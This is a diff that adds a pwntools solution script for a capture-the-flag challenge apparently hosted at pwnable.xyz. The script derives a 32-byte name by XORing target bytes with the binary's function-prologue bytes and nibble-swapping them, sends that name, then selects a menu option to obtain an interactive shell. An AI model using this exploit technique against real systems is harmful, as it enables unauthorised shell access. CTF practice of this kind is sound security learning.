@@ -1,0 +1,64 @@
+from pwn import *
+
+exe = ELF("./challenge", checksec=True)
+
+context.binary = exe
+
+HOST = "svc.pwnable.xyz"
+PORT = 30031
+
+gdbscript = """
+set follow-fork-mode child
+"""
+
+args.LOCAL = True
+# args.DEBUG = True
+
+def conn():
+    if args.LOCAL:
+        r = process(exe.path)
+        if args.DEBUG:
+            gdb.attach(r, gdbscript=gdbscript)
+    else:
+        r = remote(HOST, PORT)
+
+    return r
+
+main_code = [
+    0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x50,
+    0x64, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00,
+    0x00, 0x48, 0x89, 0x45, 0xf8, 0x31, 0xc0, 0xe8,
+    0x24, 0xfe, 0xff, 0xff, 0x48, 0x8d, 0x45, 0xc0
+]
+
+target = [
+    0x11, 0xDE, 0xCF, 0x10, 0xDF, 0x75, 0xBB, 0xA5,
+    0x43, 0x1E, 0x9D, 0xC2, 0xE3, 0xBF, 0xF5, 0xD6,
+    0x96, 0x7F, 0xBE, 0xB0, 0xBF, 0xB7, 0x96, 0x1D,
+    0xA8, 0xBB, 0x0A, 0xD9, 0xBF, 0xC9, 0x0D, 0xFF
+]
+
+def set_name(r):
+    name = b""
+    
+    for i in range(32):
+        ch = (target[i] ^ main_code[i]) & 0xff
+        name += bytes({((ch >> 4) | (ch << 4)) & 0xff})
+
+    print(name)
+    r.sendlineafter(b"> ", b"1")
+    r.sendafter(b"name: ", name)
+
+def get_shell(r):
+    r.sendlineafter(b"> ", b"4")
+    
+def main():
+    r  = conn()
+
+    set_name(r)
+    get_shell(r)
+
+    r.interactive()
+
+if __name__ == "__main__":
+    main()
